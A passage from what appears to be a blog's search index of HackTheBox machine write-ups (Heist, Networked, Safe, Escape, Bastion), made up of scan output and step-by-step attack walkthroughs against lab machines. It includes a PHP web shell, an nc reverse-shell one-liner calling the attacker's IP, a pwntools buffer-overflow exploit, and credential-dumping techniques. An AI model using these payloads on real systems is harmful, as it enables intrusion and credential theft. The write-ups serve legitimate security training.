/attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/attachments/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/IMAGES/] /INDEX.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /CSS (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/CSS/] /JS (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/JS/] /Attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/Attachments/] /LogIn.php (Status: 200) [Size: 2058] /LOGIN.php (Status: 200) [Size: 2058] Progress: 882180 / 882244 (99.99%) =============================================================== 2023/06/24 11:59:05 Finished =============================================================== Web server If we click Login as guest Foothold Let\u0026rsquo;s open the attachment Now we have 3 possible usernames: hazard, rout3r, admin And 3 passwords, which we need to decrypt Using the online decoder resulted in: $uperP@ssword, Q4)sJu\\Y8qz*A3?d And the john: stealth1agent Let\u0026rsquo;s use crackmapexec to find a correct combination Okay we have creds But they seem to work only for smb Let\u0026rsquo;s see if there are any other users on the box impacket-lookupsid hazard:stealth1agent@10.10.10.149 We now have 3 additional users: Chase, Jason and support Let\u0026rsquo;s run crackmapexec again just in case Use the creds launch evil-winrm Root Let\u0026rsquo;s enumerate for privesc Tried Lazagne, but no results Checked installed programs We see Firefox Let\u0026rsquo;s check if it\u0026rsquo;s running During enumeration process with gobuster that we have login.php Let\u0026rsquo;s check that file located in c:\\inetpub\\wwwroot We see that the password hash is hardcoded We see the params that we can use to grep from memory dump (we could also send a request and check params from the browser or proxy) We can use procdump64 to dump the firefox memory Or mimikittenz Or Out-Minidump from Powersploit Let\u0026rsquo;s grep the parameters from the memory dump We got password for administrator Use evil-winrm Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/heist/images/heist.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/","summary":"Heist Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds?","tags":["HTB","cisco","john","cisco-type-7","smbclient","smbmap","crackmapexec","rpcclient","ipc","lookupsids","evil-winrm","powershell","docker","firefox","procdump","out-minidump","mimikittenz"],"title":"[HTB] Machine: Heist"},{"categories":null,"contents":"Networked Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 85.91 seconds gpbuster └─$ gobuster dir -u 10.10.10.146 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.146 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/23 17:21:53 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 207] /uploads (Status: 301) [Size: 236] [--\u0026gt; http://10.10.10.146/uploads/] /photos.php (Status: 200) [Size: 1302] /upload.php (Status: 200) [Size: 169] /lib.php (Status: 200) [Size: 0] /backup (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.146/backup/] /.html (Status: 403) [Size: 207] Web server Backup Foothold Source code Let\u0026rsquo;s try a web shell \u0026lt;?php system($_GET['cmd']); ?\u0026gt; Create a file named shell.php.jpg and add jpg signature via hexeditor https://en.wikipedia.org/wiki/List_of_file_signatures Upload to server Spawn reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 6666 \u0026gt;/tmp/f Url encode: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E7%206666%20%3E%2Ftmp%2Ff User Enumeration It\u0026rsquo;s a cron job, so we can try command injection since we control the $value Let\u0026rsquo;s create payload file and launch our listener And we got our user Root sudo -l So let\u0026rsquo;s abuse that according to link below https://seclists.org/fulldisclosure/2019/Apr/24 ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/networked/images/networked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/networked/","summary":"Networked Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","apache","php","upload","webshell","filter","command-injection","sudo","ifcfg"],"title":"[HTB] Machine: Networked"},{"categories":null,"contents":"Safe Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.25 (Debian) 1337/tcp open waste? | fingerprint-strings: | DNSStatusRequestTCP: | 12:07:15 up 1:02, 0 users, load average: 0.07, 0.03, 0.09 | DNSVersionBindReqTCP: | 12:07:10 up 1:02, 0 users, load average: 0.08, 0.03, 0.09 | GenericLines: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | What do you want me to echo back? | GetRequest: | 12:07:03 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? GET / HTTP/1.0 | HTTPOptions: | 12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / HTTP/1.0 | Help: | 12:07:20 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? HELP | NULL: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | RPCCheck: | 12:07:05 up 1:02, 0 users, load average: 0.08, 0.04, 0.09 | RTSPRequest: | 12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / RTSP/1.0 | SSLSessionReq, TerminalServerCookie: | 12:07:21 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? | TLSSessionReq: | 12:07:22 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 |_ What do you want me to echo back? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.93%I=7%D=6/24%Time=649714C5%P=x86_64-pc-linux-gnu%r(NU SF:LL,3E,\u0026#34;\\x2012:06:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x SF:20average:\\x200\\.10,\\x200\\.04,\\x200\\.09\\n\u0026#34;)%r(GenericLines,63,\u0026#34;\\x2012:0 SF:6:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200 SF:\\.10,\\x200\\.04,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20ec SF:ho\\x20back\\?\\x20\\r\\n\u0026#34;)%r(GetRequest,71,\u0026#34;\\x2012:07:03\\x20up\\x20\\x201:02, SF:\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.0 SF:9\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20GET\\x20 SF:/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:02,\\ SF:x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.09 SF:\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIONS\\ SF:x20/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(RTSPRequest,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\ SF:.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIO SF:NS\\x20/\\x20RTSP/1\\.0\\r\\n\u0026#34;)%r(RPCCheck,3E,\u0026#34;\\x2012:07:05\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.04,\\x200\\ SF:.09\\n\u0026#34;)%r(DNSVersionBindReqTCP,3E,\u0026#34;\\x2012:07:10\\x20up\\x20\\x201:02,\\x20\\ SF:x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.03,\\x200\\.09\\n\u0026#34;) SF:%r(DNSStatusRequestTCP,3E,\u0026#34;\\x2012:07:15\\x20up\\x20\\x201:02,\\x20\\x200\\x20 SF:users,\\x20\\x20load\\x20average:\\x200\\.07,\\x200\\.03,\\x200\\.09\\n\u0026#34;)%r(Help, SF:67,\u0026#34;\\x2012:07:20\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20a SF:verage:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me SF:\\x20to\\x20echo\\x20back\\?\\x20HELP\\r\\n\u0026#34;)%r(SSLSessionReq,64,\u0026#34;\\x2012:07:21 SF:\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06 SF:,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x SF:20back\\?\\x20\\x16\\x03\\n\u0026#34;)%r(TerminalServerCookie,63,\u0026#34;\\x2012:07:21\\x20up\\ SF:x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\ SF:.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\ SF:?\\x20\\x03\\n\u0026#34;)%r(TLSSessionReq,64,\u0026#34;\\x2012:07:22\\x20up\\x20\\x201:02,\\x20\\x SF:200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nW SF:hat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20\\x16\\x03\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.88 seconds gobuster └─$ gobuster dir -u http://10.10.10.147 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.147 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/24 16:22:12 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /index.html (Status: 200) [Size: 10787] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.147/manual/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server has a hint about the port 1337 Visting path /myapp downloads myapp Let\u0026rsquo;s check port 1337 myapp file Foothold/User Let\u0026rsquo;s debug myapp main function The variable is 0x70 bytes away from the top of the stack Let\u0026rsquo;s find an offset Type set follow-fork-mode parent since pwndbg and peda sets follow mode to child, while gdb sets it to parent by default Create pattern: msf-pattern_create -l 150 Run and input the pattern Search the offset: msf-pattern_offset -q Ae0A (based on screen) We can check if the offset found is correct Execute: python3 -c 'print(\u0026quot;A\u0026quot;*120 + \u0026quot;B\u0026quot; * 8)' Run and input the string generated Okay, now we need to come up with a strategy I also found test function, which is never called We can try putting system address to r13 and place /bin/sh on top of the stack And then call test() Which should give us a shell But we need a gadget to put system to r13 Let\u0026rsquo;s search for gadgets We can do it with ropper Install: sudo apt install ropper Run: ropper myapp | grep r13 We can choose 2-nd option Our final exploit #MAIN: 0040115f #pop r13: 00401206 #test: 00401152 #system: 0040116e from pwn import * p = remote(\u0026#34;10.10.10.147\u0026#34;, 1337) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;) padding = (\u0026#34;A\u0026#34; * 112).encode() payload = \u0026#34;/bin/sh\\x00\u0026#34;.encode() ret_system = p64(0x40116e) pop_r13 = p64(0x401206) junk = p64(0x0) ret_test = p64(0x401152) p.sendline(padding + payload + pop_r13 + ret_system + junk + junk + ret_test) p.interactive() Let\u0026rsquo;s run it Root Enumerate for privesc We see MyPasswords.kdbx And also other jpg files We can upgrade our shell via ssh, so we can download the file cd /home/user/.ssh/ If you have generated id_rsa key, simply use the value in id_rsa.pub and save it to authorized_keys like down below If not, generate it and do the same thing $ echo 'ssh-rsa AAAAB3NzaC1yc2EA...' \u0026gt; authorized_keys ssh to box using your id_rsa: ssh -i id_rsa user@10.10.10.147 Now we can download MyPasswords.kdbx and JPG files scp -i id_rsa user@10.10.10.147:~/MyPasswords.kdbx ./ scp -i ~/.ssh/id_rsa user@10.10.10.147:~/*.JPG ./ Since there is an option to protect DB file using key file We can assume that those JPG file as key files, so we can create hashes for each of the six images as keyfiles for i in *.JPG; do (keepass2john -k $i MyPasswords.kdbx \u0026gt;\u0026gt; hashes.txt); done; Use john to crack the hashes Once we get our password we can use it to explore MyPasswords.kdbx We see the Root password entry Use it to su ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/safe/images/safe.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/safe/","summary":"Safe Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.","tags":["HTB","rop","pwntools","bof","python","keepass","kpcli","john"],"title":"[HTB] Machine: Safe"},{"categories":null,"contents":"Escape Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2023-05-21T21:25:46+00:00; +7h59m36s from scanner time. | ms-sql-ntlm-info: | 10.10.11.202:1433: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-05-19T20:14:37 |_Not valid after: 2053-05-19T20:14:37 | ms-sql-info: | 10.10.11.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m36s from scanner time. 4966/tcp filtered unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC 58597/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-05-21T21:25:07 |_ start_date: N/A |_clock-skew: mean: 7h59m35s, deviation: 0s, median: 7h59m34s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.84 seconds smb We see a pdf file We have the creds in Bonus section Foothold Let\u0026rsquo;s check creds from pdf We have an access So I connected to SQL and tried enumerating it using the hacktricks checklist Checked sql_users Checked linked_servers Then I noticed I got to the part with NTLM and Relay attacks Let\u0026rsquo;s try stealing hash And we get sql_svc\u0026rsquo;s hash Let\u0026rsquo;s crack it Use evil-winrm to connect to box User I spent a significant time enumerating the box to get a user I noticed a SQLServer logs Where we can find user creds Now we get our user Root During enumeration, I noticed user certificates pop up in user\u0026rsquo;s object Moreover the name of the box is Escape, so I thought it could be related to ESC attacks targeting ADCS So let\u0026rsquo;s upload certify and run it to find vulnerable certificate templates Okay, we find one Let\u0026rsquo;s google a bit to find a suitable attack Let\u0026rsquo;s request a certificate, since we have a UserAuthentification Now, we need to convert it to pfx Now we can upload pfx to box and use Rubeus for ptt attack SharpCollection to download Rubeus Let\u0026rsquo;s check tgt We\u0026rsquo;re adminstrator However I could enter Administrator\u0026rsquo;s folders It looks like it doesn\u0026rsquo;t work with evil-winrm So I was able to access them using alternative way with certipy Notice that I sync my time with the time of the box Note: Looks like there was a way to dump the hashes from evil-winrm .\\Rubeus.exe asktgt /user:administrator /certificate:\u0026lt;Certificate\u0026gt; /getcredentials /show /nowrap ","date":"June 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/escape/images/escape.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/escape/","summary":"Escape Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.","tags":["HTB","crackmapexec","smbclient","mssql","mssqlclient","xp-cmdshell","responder","net-ntlmv2","hashcat","winrm","evil-winrm","certify","adcs","rubeus","certipy","silver-ticket","pass-the-hash","xp-dirtree"],"title":"[HTB] Machine: Escape"},{"categories":null,"contents":"Bastion Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-17T22:20:49+02:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.14 seconds smbmap └─$ smbmap -H 10.10.10.134 -R -u pentest [+] Guest session IP: 10.10.10.134:445 Name: 10.10.10.134 [-] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\UEQFPWNJOX, please remove manually Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE .\\Backups\\* dr--r--r-- 0 Sun Jun 18 09:58:58 2023 . dr--r--r-- 0 Sun Jun 18 09:58:58 2023 .. fw--w--w-- 116 Tue Apr 16 12:43:19 2019 note.txt fr--r--r-- 0 Fri Feb 22 12:43:28 2019 SDT65CB.tmp dr--r--r-- 0 Sun Jun 18 09:58:58 2023 UEQFPWNJOX dr--r--r-- 0 Fri Feb 22 12:44:02 2019 WindowsImageBackup .\\Backups\\WindowsImageBackup\\* dr--r--r-- 0 Fri Feb 22 12:44:02 2019 . dr--r--r-- 0 Fri Feb 22 12:44:02 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 L4mpje-PC .\\Backups\\WindowsImageBackup\\L4mpje-PC\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Backup 2019-02-22 124351 dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Catalog fr--r--r-- 16 Fri Feb 22 12:44:02 2019 MediaId dr--r--r-- 0 Fri Feb 22 12:45:32 2019 SPPMetadataCache .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 37761024 Fri Feb 22 12:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 5418299392 Fri Feb 22 12:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 1186 Fri Feb 22 12:45:32 2019 BackupSpecs.xml fr--r--r-- 1078 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml fr--r--r-- 8930 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml fr--r--r-- 6542 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml fr--r--r-- 2894 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml fr--r--r-- 1488 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml fr--r--r-- 1484 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml fr--r--r-- 3844 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml fr--r--r-- 3988 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml fr--r--r-- 7110 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml fr--r--r-- 2374620 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Catalog\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 5698 Fri Feb 22 12:45:32 2019 BackupGlobalCatalog fr--r--r-- 7440 Fri Feb 22 12:45:32 2019 GlobalCatalog .\\Backups\\WindowsImageBackup\\L4mpje-PC\\SPPMetadataCache\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 57848 Fri Feb 22 12:45:32 2019 {cd113385-65ff-4ea2-8ced-5630f6feca8f} C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC .\\IPC$\\* fr--r--r-- 3 Sun Dec 31 23:58:45 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 